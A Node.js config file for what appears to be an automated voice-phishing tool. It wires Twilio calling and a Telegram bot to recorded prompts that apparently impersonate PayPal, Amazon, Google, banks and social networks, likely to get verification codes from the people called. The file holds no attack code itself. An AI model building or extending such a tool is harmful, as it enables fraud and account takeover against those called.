require('dotenv').config(); // Load environment variables from .env file

module.exports = {
    setupdone: process.env.SETUP_DONE || 'true',

    /**
     * Information about the Twilio account
     */
    accountSid: process.env.TWILIO_ACCOUNT_SID,
    authToken: process.env.TWILIO_AUTH_TOKEN,
    callerid: process.env.TWILIO_CALLER_ID,

    /**
     * Information about the API
     */
    apipassword: process.env.API_PASSWORD,
    serverurl: process.env.SERVER_URL,

    /**
     * Information about the Telegram bot
     */
    telegramChatId: process.env.TELEGRAM_CHAT_ID,
    telegramBotToken: process.env.TELEGRAM_BOT_TOKEN,

    /**
     * Port on which the Express server runs
     */
    port: process.env.PORT || 1337,

    /**
     * Storage paths for audio files
     */
    amazonfilepath: process.env.AMAZON_FILE_PATH || './voice/en/amazon/ask-amazon.mp3',
    cdiscountfilepath: process.env.CDISCOUNT_FILE_PATH || './voice/en/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: process.env.TWITTER_FILE_PATH || './voice/en/twitter/ask-twitter.mp3',
    whatsappfilepath: process.env.WHATSAPP_FILE_PATH || './voice/en/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: process.env.PAYPAL_FILE_PATH || './voice/en/paypal/ask-pp.mp3',
    googlefilepath: process.env.GOOGLE_FILE_PATH || './voice/en/google/ask-google.mp3',
    snapchatfilepath: process.env.SNAPCHAT_FILE_PATH || './voice/en/snapchat/ask-snapchat.mp3',
    instagramfilepath: process.env.INSTAGRAM_FILE_PATH || './voice/en/instagram/ask-instagram.mp3',
    facebookfilepath: process.env.FACEBOOK_FILE_PATH || './voice/en/facebook/ask-facebook.mp3',
    endfilepath: process.env.END_FILE_PATH || './voice/en/done/call-done.mp3',
    defaultfilepath: process.env.DEFAULT_FILE_PATH || './voice/en/default/ask-default.mp3',
    banquefilepath: process.env.BANQUE_FILE_PATH || './voice/en/banque/ask-banque.mp3',

    /**
     * SMS content based on requested services
     */
    paypalsms: process.env.PAYPAL_SMS || 'pp test 123'
};
